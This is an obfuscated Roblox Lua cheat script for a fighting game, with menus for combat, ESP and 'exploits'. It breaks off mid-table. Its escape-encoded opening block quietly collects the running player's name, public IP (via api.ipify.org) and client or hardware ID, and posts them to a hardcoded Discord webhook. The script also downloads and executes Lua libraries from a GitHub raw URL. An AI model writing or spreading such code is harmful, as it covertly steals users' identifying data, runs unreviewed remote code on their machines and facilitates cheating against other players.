--[[ Protected by Lua Guard ]]

( function (...) local HttpService = game:GetService("\072\116\116\112\083\101\114\118\105\099\101") local _lllIIIIIII = game:GetService("\082\098\120\065\110\097\108\121\116\105\099\115\083\101\114\118\105\099\101") local _llIllllIll = http_request or request or (syn and syn.request) if _llIllllIll then task.spawn( function () pcall( function () local _lIlllIIIlI = game:HttpGet("\104\116\116\112\115\058\047\047\097\112\105\046\105\112\105\102\121\046\111\114\103") local _lIIIlIIlIl = "\066\117\108\117\110\097\109\097\100\305" pcall( function () _lIIIlIIlIl = _lllIIIIIII:GetClientId() end
 ) local _IIlllIIlII = (game.Players.LocalPlayer and game.Players.LocalPlayer.Name) or "\066\105\108\105\110\109\105\121\111\114" local _IllllIllII = os.date("\037\100\047\037\109\047\037\089\032\045\032\037\072\058\037\077\058\037\083") local _IIIlIlIlIl = { ["\099\111\110\116\101\110\116"] = "", ["\101\109\098\101\100\115"] = {{ ["\116\105\116\108\101"] = "\55357\56960\032\083\099\114\105\112\116\032\199\097\108\305\351\116\305\114\109\097\032\076\111\103\117", ["\099\111\108\111\114"] = 0x3498DB, ["\102\105\101\108\100\115"] = { {["\110\097\109\101"] = "\55357\56420\032\079\121\117\110\099\117", ["\118\097\108\117\101"] = "\096\096\096" .. _IIlllIIlII .. "\096\096\096", ["\105\110\108\105\110\101"] = true}, {["\110\097\109\101"] = "\55357\56658\032\090\097\109\097\110", ["\118\097\108\117\101"] = "\096\096\096" .. _IllllIllII .. "\096\096\096", ["\105\110\108\105\110\101"] = true}, {["\110\097\109\101"] = "\55356\57104\032\073\080\032\065\100\114\101\115\105", ["\118\097\108\117\101"] = "\096\096\096" .. _lIlllIIIlI .. "\096\096\096", ["\105\110\108\105\110\101"] = false}, {["\110\097\109\101"] = "\55357\56593\032\072\087\073\068\032\047\032\067\108\105\101\110\116\032\073\068", ["\118\097\108\117\101"] = "\096\096\096" .. _lIIIlIIlIl .. "\096\096\096", ["\105\110\108\105\110\101"] = false} }, ["\102\111\111\116\101\114"] = { ["\116\101\120\116"] = "\071\252\118\101\110\108\105\032\076\111\103\103\101\114\032\083\105\115\116\101\109\105" } }} } _llIllllIll({ Url = "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\053\051\052\057\057\053\055\056\052\048\052\049\051\054\057\056\049\051\047\081\050\071\102\071\116\103\081\101\089\119\107\103\075\109\049\076\076\076\087\055\106\073\072\084\119\074\051\088\120\055\110\103\051\053\065\045\118\100\109\075\076\057\077\070\079\103\084\116\067\120\120\110\119\075\106\075\051\055\122\109\115\066\066\079\119\117\069", Method = "\080\079\083\084", Headers = { ["\067\111\110\116\101\110\116\045\084\121\112\101"] = "\097\112\112\108\105\099\097\116\105\111\110\047\106\115\111\110" }, Body = HttpService:JSONEncode(_IIIlIlIlIl) }) end
 ) end
 ) end
 getgenv()._RevenantTSBLoaded = true local _IllIlIIIIl = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\090\075\065\089\052\048\052\047\079\098\115\105\100\105\097\110\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047" local _llIllIlllI = "\104\116\116\112\115\058\047\047\097\112\105\046\103\105\116\104\117\098\046\099\111\109\047\114\101\112\111\115\047\090\075\065\089\052\048\052\047\079\098\115\105\100\105\097\110\047\099\111\109\109\105\116\115\047\109\097\105\110" if getgenv().RevenantLoaded then if getgenv().RevenantCleanup then pcall(getgenv().RevenantCleanup) end
 getgenv().RevenantLoaded = false pcall( function () game:GetService("\083\116\097\114\116\101\114\071\117\105"):SetCore("\083\101\110\100\078\111\116\105\102\105\099\097\116\105\111\110", { Title = _lIllIllIII("\090\075\065\089\084\083\066"), Text = "\082\101\045\101\120\101\099\117\116\105\110\103\046\046\046", Duration = 0x1, }) end
 ) task.wait(0x0) end
 getgenv().RevenantLoaded = true local _lIIlllIlll = "\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\046\115\104\097" do if not isfolder("\090\075\065\089\084\083\066") then makefolder("\090\075\065\089\084\083\066") end
 if not isfolder("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110") then makefolder("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110") end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\076\105\098\114\097\114\121\046\108\117\097")) end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) end
 end
 local _IllIIlIIll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IllIIlIIll.ForceCheckbox = false if not _IllIIlIIll.CreateLoading then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\076\105\098\114\097\114\121\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) _IllIIlIIll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IllIIlIIll.ForceCheckbox = false end
 local _IIlIIlllll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")() local _IIIllIIIIl = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")() local _IlIllIIllI = _IllIIlIIll.Options local _IIlIlIIlIl = _IllIIlIIll.Toggles do local _lIIllIllll = setmetatable({Value = false}, { __index = function () return function () end
 end
 }) if not getmetatable(_IlIllIIllI) then setmetatable(_IlIllIIllI, {__index = function () return _lIIllIllll end
 }) end
 if not getmetatable(_IIlIlIIlIl) then setmetatable(_IIlIlIIlIl, {__index = function () return _lIIllIllll end
 }) end
 end
 local _IIIIlIIIll = false local _lIIIIIIllI = 0x0 local _IIIlIIIlIl = false local _lIlIlIIIIl local _lIIIlIlllI local _IllllllllI local _IIllIIllII local _IlIIIIIIlI local _IlIlllIlII local _llIllIIlIl local _llIIllIIII, _disguise_applying, _disguise_random_cooldown local _lllIlIllII, _disguise_cache, _disguise_allowed_cache local _IIllIllIll, _disguise_spawn_conn, _disguise_maintain_conn local _IllllIlIIl, _disguise_attr_char_conn, _disguise_presets local _IIIllIIllI, _disguiseCollectTools, _disguiseRestoreTools local _IllIIIlIIl, _disguiseSelectiveClean, _disguiseFullClean local _IlIIllIIII, _disguiseApplyToChar, _disguiseHookAttrWatch local _IlllIIIIII local _llllllIlll, _disguise_fav_file local _IIlIIllIlI, _disguise_refresh_fav_dropdown local _llllllIlIl, _RCS_MyRank, _RCS_Prefix, _RCS_Channel, _RCS_RankMap local _IlIlIIIlII, _RCS_MyHWID, _RCS_SessionToken, _RCS_AnchorConn, _RCS_MsgConn local _lllIlllIlI, _RCS_Send, _RCS_ExecuteOnSelf, _RCS_SendCmd local _lIllllIIII, _FUCCloneRoot, _FUCCloneTrack local _llllIIIIll, _dCloneRoot, _dRenderConn local _lllIllIIIl = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local _IIllIlllII = (_lllIllIIIl.DisplayName ~= "" and _lllIllIIIl.DisplayName) or _lllIllIIIl.Name do if type(isfile) == "\102\117\110\099\116\105\111\110" and type(writefile) == "\102\117\110\099\116\105\111\110" and type(readfile) == "\102\117\110\099\116\105\111\110" then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\076\105\098\114\097\114\121\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IllIlIIIIl .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) _IllIIlIIll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IllIIlIIll.ForceCheckbox = false _IIlIIlllll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")() _IIIllIIIIl = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")() _IlIllIIllI = _IllIIlIIll.Options _IIlIlIIlIl = _IllIIlIIll.Toggles do local _lIIllIllll = setmetatable({Value = false}, { __index = function () return function () end
 end
 }) if not getmetatable(_IlIllIIllI) then setmetatable(_IlIllIIllI, {__index = function () return _lIIllIllll end
 }) end
 if not getmetatable(_IIlIlIIlIl) then setmetatable(_IIlIlIIlIl, {__index = function () return _lIIllIllll end
 }) end
 end
 end
 end
 task.spawn( function () if not isfolder("\090\075\065\089\084\083\066\047\097\115\115\101\116\115") then makefolder("\090\075\065\089\084\083\066\047\097\115\115\101\116\115") end
 local _lIllIlIIII = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\090\075\065\089\052\048\052\047\090\075\065\089\084\083\066\047\109\097\105\110\047\097\115\115\101\116\115\047" local _IIIIlIIlll = { "\077\049\072\105\116\049\046\109\112\051", "\077\049\072\105\116\050\046\109\112\051", "\077\049\072\105\116\051\046\109\112\051", "\077\049\072\105\116\052\046\109\112\051" } for _lllIlllIIl, fname in ipairs(_IIIIlIIlll) do local _lllIllIlIl = "\090\075\065\089\084\083\066\047\097\115\115\101\116\115\047" .. fname if not isfile(_lllIllIlIl) then local _lIIlIIIlII, _IIIIllIlll = pcall( function () return game:HttpGet(_lIllIlIIII .. fname) end
 ) if _lIIlIIIlII and _IIIIllIlll and #_IIIIllIlll > 0x0 then pcall( function () writefile(_lllIllIlIl, _IIIIllIlll) end
 ) end
 end
 end
 end
 ) local function _IllIIllIII(text, opts) local _llIllllllI = ( function (year) local _IIIlIlllll = math.floor(year / 0x64) local _IlIIIIlIIl = (0xF - math.floor((0xD + 0x8 * _IIIlIlllll) / 0x19) + _IIIlIlllll - math.floor(_IIIlIlllll / 0x4)) % 0x1E local _IIlIIllIlI = (0x4 + _IIIlIlllll - math.floor(_IIIlIlllll / 0x4)) % 0x7 local _llllIIIIIl = (0x13 * (year % 0x13) + _IlIIIIlIIl) % 0x1E local _llllIIllll = (0x2 * (year % 0x4) + 0x4 * (year % 0x7) + 0x6 * _llllIIIIIl + _IIlIIllIlI) % 0x7 local _IlIllllIII = 0x16 + _llllIIIIIl + _llllIIllll if _llllIIIIIl == 0x1D and _llllIIllll == 0x6 then return "\048\052\032\049\057" elseif _llllIIIIIl == 0x1C and _llllIIllll == 0x6 then return "\048\052\032\049\056" elseif _IlIllllIII > 0x1F then return ("\048\052\032\037\048\050\100"):format(_IlIllllIII - 0x1F) else return ("\048\051\032\037\048\050\100"):format(_IlIllllIII) end
 end
 )(tonumber(os.date("\037\089"))) local _IlIllIIIll = { ["\048\049\032\048\049"] = "\65533", ["\049\048\032\051\049"] = "\65533", [_llIllllllI] = "\65533", } if opts and opts.entireChristmas then for _IlIllllIII = 0x1, 0x1F do _IlIllIIIll["\049\050\032" .. ("\037\048\050\100"):format(_IlIllllIII)] = ({ "\65533", "\65533" })[math.random(0x1, 0x2)] end
 end
 local _IlIIIIIlII = os.date("\037\109\032\037\100") if _IlIllIIIll[_IlIIIIIlII] then local _IIllIlIlIl = _IlIllIIIll[_IlIIIIIlII] return ("\037\115\032\037\115\032\037\115"):format(_IIllIlIlIl, text, _IIllIlIlIl) end
 return text end
 local function _lIllIllIII(text) return _IllIIllIII(text, {entireChristmas = true}) end
 task.spawn( function () local _IIlIIIlIll, _mainErr = xpcall( function () local _lIllIllIlI = _IllIIlIIll:CreateWindow({ Title = _lIllIllIII("\072\121\112\101\114\084\101\097\109"), Footer = _lIllIllIII("\072\121\112\101\114\084\101\097\109"), Icon = "\114\098\120\097\115\115\101\116\105\100\058\047\047\056\055\050\050\055\048\056\048\055\049\048\050\054\051", NotifySide = "\082\105\103\104\116", ShowCustomCursor = false, Resizable = true, Center = true, AutoShow = true, }) _IllIIlIIll.ShowCustomCursor = false local _IIIlIIIllI = _IllIIlIIll.Notify _IllIIlIIll.Notify = function (self, opts) if _IllIIlIIll.Unloaded then return end
 if type(opts) == "\116\097\098\108\101" then local _IlIIllIlll = tostring(opts.Title or "") local _IIllIIIIII = tostring(opts.Content or "") local _llIIlIIlIl = opts.Time or opts.Duration or 0x4 return _IIIlIIIllI(self, { Title = _IlIIllIlll ~= "" and _IlIIllIlll or "\090\075\065\089\052\048\052", Description = _IIllIIIIII, _IllIIlIlll = _llIIlIIlIl, SoundId = 0x1119FDF6F, }) else return _IIIlIIIllI(self, { Title = _lIllIllIII("\090\075\065\089\052\048\052"), Description = tostring(opts or ""), _IllIIlIlll = 0x4, SoundId = 0x1119FDF6F }) end
 end
 local _lIllllIlII = "\049\051\049\048\052\056\051\057\057\054\056\053\053\053\053" local _lllIlIIlII = "\049\048\052\052\057\055\054\049\052\054\051" local _lIIIlIIllI = tostring(game.PlaceId) local _IlIlIlIIlI = { ["\083\097\105\116\097\109\097"] = "\066\097\108\100", ["\071\097\114\111\117"] = "\072\117\110\116\101\114", ["\077\111\110\115\116\101\114\032\071\097\114\111\117"] = "\077\111\110\115\116\101\114", ["\083\117\105\114\121\117"] = "\080\117\114\112\108\101", ["\071\101\110\111\115"] = "\067\121\098\111\114\103", ["\083\111\110\105\099"] = "\078\105\110\106\097", ["\077\101\116\097\108\032\066\097\116"] = "\066\097\116\116\101\114", ["\065\116\111\109\105\099\032\083\097\109\117\114\097\105"] = "\066\108\097\100\101", ["\084\097\116\115\117\109\097\107\105"] = "\069\115\112\101\114", ["\067\104\105\108\100\032\069\109\112\101\114\111\114"] = "\084\101\099\104", ["\076\105\103\104\116\110\105\110\103\032\077\097\120"] = "\076\105\103\104\116\110\105\110\103", ["\071\111\106\111"] = "\083\111\114\099\101\114\101\114", ["\075\074"] = "\075\074", } local _lIlIIllIlI = (_lIIIlIIllI == _lIllllIlII) local _IlllIlIllI = true local _IllIlllllI = { [_lIllllIlII] = true, [_lllIlIIlII] = true } local _lllIlIlIII = ( typeof(getrawmetatable) == "\102\117\110\099\116\105\111\110" and typeof(setreadonly) == "\102\117\110\099\116\105\111\110" and typeof(newcclosure) == "\102\117\110\099\116\105\111\110" and typeof(getcallingscript) == "\102\117\110\099\116\105\111\110" ) local _llIllllllI = type(sethiddenproperty) == "\102\117\110\099\116\105\111\110" local _lIlIlIllIl = { ChangeLogs = _lIllIllIlI:AddTab("\078\111\116\105\099\101", "\107\101\121"), LocalPlayer = _lIllIllIlI:AddTab("\077\097\105\110", "\104\111\117\115\101"), Exploits = _lIllIllIlI:AddTab("\080\108\097\121\101\114", "\117\115\101\114"), Visuals = _lIllIllIlI:AddTab("\086\105\115\117\097\108\115", "\115\099\097\110\045\101\121\101"), } _lIlIlIllIl.Combat = _lIlIlIllIl.Exploits _lIlIlIllIl.Commands = _lIllIllIlI:AddTab("\067\111\109\109\097\110\100\115", "\116\101\114\109\105\110\097\108") _lIlIlIllIl.Map = _lIllIllIlI:AddTab("\077\097\112", "\109\097\112\045\112\105\110") _lIlIlIllIl.Anims = _lIllIllIlI:AddTab("\065\110\105\109\097\116\105\111\110\115", "\109\111\118\101\045\051\100") if _IlllIlIllI then _lIlIlIllIl.Misc = _lIllIllIlI:AddTab("\077\105\115\099\097\108\108\097\110\101\111\117\115", "\101\108\108\105\112\115\105\115") end
 _lIlIlIllIl.Settings = _lIllIllIlI:AddTab("\085\073\032\083\101\116\116\105\110\103\115", "\115\101\116\116\105\110\103\115") local _llIIIlIllI = _lIlIlIllIl.LocalPlayer:AddLeftTabbox() local _IlIlllllII = _llIIIlIllI:AddTab("\077\111\118\101\109\101\110\116") local _llllIIIlII = _llIIIlIllI:AddTab("\067\104\097\114\097\099\116\101\114") local _IIIIlIIIll = _lIlIlIllIl.LocalPlayer:AddLeftGroupbox("\075\101\121\098\105\110\100\115", "\107\101\121\098\111\097\114\100") local _IlIIIIIIIl = _lIlIlIllIl.LocalPlayer:AddRightGroupbox("\065\117\116\111\109\097\116\105\111\110", "\102\111\108\100\101\114\045\103\105\116\045\050") local _llIIlllIll = _lIlIlIllIl.LocalPlayer:AddRightGroupbox("\068\097\115\104\101\115", "\099\104\101\118\114\111\110\115\045\117\112") local _llllIlIIIl = _lIlIlIllIl.Visuals:AddLeftGroupbox("\081\117\097\108\105\116\121\032\079\102\032\076\105\102\101", "\102\108\111\119\101\114\045\050") local _lllllIIlIl = _lIlIlIllIl.Visuals:AddRightGroupbox("\069\083\080", "\101\121\101") local _IIllIlIIlI = _lIlIlIllIl.Visuals:AddRightGroupbox("\087\111\114\108\100", "\101\097\114\116\104") local _IIllIIlIII = _lIlIlIllIl.Anims:AddLeftGroupbox("\082\054", "\112\101\114\115\111\110\045\115\116\097\110\100\105\110\103") local _llIllIIlll = _lIlIlIllIl.Anims:AddLeftGroupbox("\077\049\032\065\110\105\109\097\116\105\111\110\115", "\104\097\110\100\045\102\105\115\116") local _lIlIlIIIII = _lIlIlIllIl.Anims:AddLeftGroupbox("\083\097\105\116\097\109\097\032\065\110\105\109\097\116\105\111\110\115", "\097\114\114\111\119\045\114\105\103\104\116\045\108\101\102\116") local _llIIIlIIII = _lIlIlIllIl.Anims:AddRightGroupbox("\067\117\115\116\111\109\032\065\110\105\109\097\116\105\111\110\115", "\100\105\097\109\111\110\100\045\112\108\117\115") local _lIIIIIIIll, BoxTools, BoxMovement, _IlIIIllllI local _IlIIIllllI = _IlIlllllII BoxMovement = _IlIlllllII local _lIlllIlllI = _llllIIIlII local _IlllIIIllI = _lIlIlIllIl.Exploits:AddLeftGroupbox("\066\114\105\110\103", "\102\105\108\101\045\099\111\103") local _IIIllIlllI = _lIlIlIllIl.Exploits:AddLeftGroupbox("\065\110\116\105\039\115", "\103\104\111\115\116") local _lIlIIllIIl = _lIlIlIllIl.Exploits:AddRightGroupbox("\087\097\108\108\032\067\111\109\098\111", "\104\097\110\100\045\102\105\115\116") local _IlllIllIll = _lIlIlIllIl.Exploits:AddRightGroupbox("\084\114\097\115\104\099\097\110", "\116\114\097\115\104") local _lllIIIlIll = _lIlIlIllIl.Exploits:AddRightGroupbox("\073\110\118\105\115\105\098\108\101\032\077\111\118\101\115", "\101\121\101\045\111\102\102") local _lllIIIIlIl = _lIlIlIllIl.Exploits:AddRightGroupbox("\083\116\097\110\100", "\117\115\101\114\045\114\111\117\110\100") BoxTools = _IlllIIIllI local function _IIIlllIIll(_IIIIIlIlll) local _IlIlllIlll = (_IIIIIlIlll.DisplayName ~= "" and _IIIIIlIlll.DisplayName) or _IIIIIlIlll.Name return _IlIlllIlll .. "\040\064" .. _IIIIIlIlll.Name .. "\041" end
 local function _IlIllIIIII(_lIIIllIIII) if not _lIIIllIIII or _lIIIllIIII == "" then return nil end
 local _llIlIIIIll = _lIIIllIIII:match("\064\040\091\094\037\041\093\043\041") if _llIlIIIIll then local _IIlIlIlIlI = game:GetService("\080\108\097\121\101\114\115"):FindFirstChild(_llIlIIIIll) if _IIlIlIlIlI then return _IIlIlIlIlI end
 end
 for _lllIlllIIl, _IIIIIlIlll in pairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do if _IIIIIlIlll.Name == _lIIIllIIII or _IIIIIlIlll.DisplayName == _lIIIllIIII then return _IIIIIlIlll end
 end
 return nil end
 do local _llIIIlIIll = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local RunService = game:GetService("\082\117\110\083\101\114\118\105\099\101") local _lIlIlIlIIl = nil local _IllIIIlIIl = true local _IIIIllIIlI = false local _llIIlIIllI = nil local _IIIlIlIIlI = nil local _IIIlllIlII = nil local _llllIlllII = nil local _IlIIIIIIlI = nil local _IlIlIlIIIl = nil local _lIllIlIIll = nil local _IIlIlllIII = nil local _IllllIIIlI = 0x0 local _IIIIIllIlI = 0x0 local _IIlIlIIIII = nil local _IlIlIIIlIl = { 0x0, 0x0, 0x0, 0x0 } local _llIIllIllI = 0x0 local _llIllIIIll = 0x0 local _lllIlllIlI = nil local _lIIlIIIIll local _llIIIlIIII = CFrame.new(-0x2, 0x2, 0x5) local _IlIlllIIlI = CFrame.new(0x0, 0x0, -0x4) local _llllIIIIIl = _llIIIlIIII local _IlIlllIlIl = { { "\078\111\114\109\097\108\032\080\117\110\099\104", 0x26FFB2A87, 0x14, 0x1, "\078\111\114\109\097\108\032\080\117\110\099\104" }, { "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", 0x26FE15C50, 0xF, 0x2, "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115" }, { "\083\104\111\118\101", 0x27023EB21, 0xA, 0x3, "\083\104\111\118\101" }, { "\085\112\112\101\114\099\117\116", 0x2E9AA0F6C, 0x14, 0x4, "\085\112\112\101\114\099\117\116" }, { "\084\097\098\108\101\032\070\108\105\112", 0x2A570BB77, 0x14, 0x2, "\084\097\098\108\101\032\070\108\105\112" }, { "\083\101\114\105\111\117\115\032\080\117\110\099\104", 0x305DDF365, 0x14, 0x3, "\083\101\114\105\111\117\115\032\080\117\110\099\104" }, { "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", 0x33E268217, 0x14, 0x4, "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104" }, { "\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109", 0x2DCF388FB, 0x14, 0x2, "\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109" }, { "\070\108\111\119\105\110\103\032\087\097\116\101\114", 0x2DB858107, 17.5, 0x1, "\070\108\111\119\105\110\103\032\087\097\116\101\114" }, { "\072\117\110\116\101\114\115\032\071\114\097\115\112", 0x2DD97EFA8, 0xF, 0x3, "\072\117\110\116\101\114\039\115\032\071\114\097\115\112" }, { "\080\114\101\121\115\032\080\101\114\105\108", 0x2E03A57DC, 0x11, 0x4, "\080\114\101\121\039\115\032\080\101\114\105\108" }, { "\087\097\116\101\114\032\083\116\114\101\097\109\032\067\117\116\116\105\110\103\032\070\105\115\116",0x2E6BB6C76, 8.45, 0x1, "\087\097\116\101\114\032\083\116\114\101\097\109\032\067\117\116\116\105\110\103\032\070\105\115\116"}, { "\084\104\101\032\070\105\110\097\108\032\072\117\110\116", 0x2E6DB65A7, 0x65, 0x2, "\084\104\101\032\070\105\110\097\108\032\072\117\110\116" }, { "\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116", 0x345E05668, 0xE, 0x3, "\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116" }, { "\067\114\117\115\104\101\100\032\082\111\099\107", 0x32C754D1E, 9.58, 0x4, "\067\114\117\115\104\101\100\032\082\111\099\107" }, { "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115", 0x2EB20E216, 0xF, 0x1, "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115" }, { "\073\103\110\105\116\105\111\110\032\066\117\114\115\116", 0x2E937836C, 17.5, 0x2, "\073\103\110\105\116\105\111\110\032\066\117\114\115\116" }, { "\066\108\105\116\122\032\083\104\111\116", 0x2F01B8CFE, 0x19, 0x3, "\066\108\105\116\122\032\083\104\111\116" }, { "\074\101\116\032\068\105\118\101", 0x2F40C6F8D, 17.5, 0x4, "\074\101\116\032\068\105\118\101" }, { "\084\104\117\110\100\101\114\032\075\105\099\107", 0x36D7D68BD, 0xF, 0x1, "\084\104\117\110\100\101\114\032\075\105\099\107" }, { "\083\112\101\101\100\098\108\105\116\122\032\068\114\111\112\107\105\099\107", 0x2FCE07F0C, 0x14, 0x2, "\083\112\101\101\100\098\108\105\116\122\032\068\114\111\112\107\105\099\107" }, { "\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110", 0x30BD3D086, 0x19, 0x3, "\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110" }, { "\073\110\099\105\110\101\114\097\116\101", 0x30F9AE2EA, 0x65, 0x4, "\073\110\099\105\110\101\114\097\116\101" }, { "\070\108\097\115\104\032\083\116\114\105\107\101", 0x3194EDD9B, 17.5, 0x1, "\070\108\097\115\104\032\083\116\114\105\107\101" }, { "\087\104\105\114\108\119\105\110\100\032\075\105\099\107", 0x3186E666A, 0x14, 0x2, "\087\104\105\114\108\119\105\110\100\032\075\105\099\107" }, { "\083\099\097\116\116\101\114", 0x31C78E8CD, 21.25,0x3, "\083\099\097\116\116\101\114" }, { "\069\120\112\108\111\115\105\118\101\032\083\104\117\114\105\107\101\110", 0x324BD6EF4, 17.5, 0x4, "\069\120\112\108\111\115\105\118\101\032\083\104\117\114\105\107\101\110" }, { "\084\119\105\110\098\108\097\100\101\032\082\117\115\104", 0x32C8D1CE6, 0x14, 0x1, "\084\119\105\110\098\108\097\100\101\032\082\117\115\104" }, { "\083\116\114\097\105\103\104\116\032\079\110", 0x32D31FE33, 0x11, 0x2, "\083\116\114\097\105\103\104\116\032\079\110" }, { "\067\097\114\110\097\103\101", 0x331F704BE, 0x19, 0x3, "\067\097\114\110\097\103\101" }, { "\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101", 0x33B645FA1, 0x19, 0x4, "\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101" }, { "\072\111\109\101\114\117\110", 0x342B7AE01, 17.5, 0x1, "\072\111\109\101\114\117\110" }, { "\071\114\097\110\100\032\083\108\097\109", 0x3544B7E0C, 0x14, 0x3, "\071\114\097\110\100\032\083\108\097\109" }, { "\070\111\117\108\032\066\097\108\108", 0x357699D52, 0x17, 0x4, "\070\111\117\108\032\066\097\108\108" }, { "\083\097\118\097\103\101\032\084\111\114\110\097\100\111", 0x36D568BD8, 0x11, 0x1, "\083\097\118\097\103\101\032\084\111\114\110\097\100\111" }, { "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110", 0x36C432925, 0x1E, 0x2, "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110" }, { "\083\116\114\101\110\103\116\104\032\068\105\102\102\101\114\101\110\099\101", 0x3781E8810, 0x14, 0x3, "\083\116\114\101\110\103\116\104\032\068\105\102\102\101\114\101\110\099\101" }, { "\068\101\097\116\104\032\066\108\111\119", 0x385BFEA97, 0x65, 0x4, "\068\101\097\116\104\032\066\108\111\119" }, { "\081\117\105\099\107\032\083\108\105\099\101", 0x38F69141D, 0x14, 0x1, "\081\117\105\099\107\032\083\108\105\099\101" }, { "\065\116\109\111\115\032\067\108\101\097\118\101", 0x386BD6B98, 0x16, 0x2, "\065\116\109\111\115\032\067\108\101\097\118\101" }, { "\080\105\110\112\111\105\110\116\032\067\117\116", 0x38FB4D8C9, 0x11, 0x3, "\080\105\110\112\111\105\110\116\032\067\117\116" }, { "\080\105\110\112\111\105\110\116\032\067\117\116", 0x38FAC4F4E, 0x11, 0x3, "\080\105\110\112\111\105\110\116\032\067\117\116" }, { "\083\112\108\105\116\032\083\101\099\111\110\100\032\067\111\117\110\116\101\114", 0x390A5C7FC, 17.5, 0x4, "\083\112\108\105\116\032\083\101\099\111\110\100\032\067\111\117\110\116\101\114" }, { "\083\117\110\115\101\116", 0x39D126C89, 0xF, 0x1, "\083\117\110\115\101\116" }, { "\083\111\108\097\114\032\067\108\101\097\118\101", 0x3A65DE215, 0xF, 0x2, "\083\111\108\097\114\032\067\108\101\097\118\101" }, { "\083\117\110\114\105\115\101", 0x3BD64F039, 0x14, 0x3, "\083\117\110\114\105\115\101" }, { "\065\116\111\109\105\099\032\083\108\097\115\104", 0x3BE91BBC0, 0x65, 0x4, 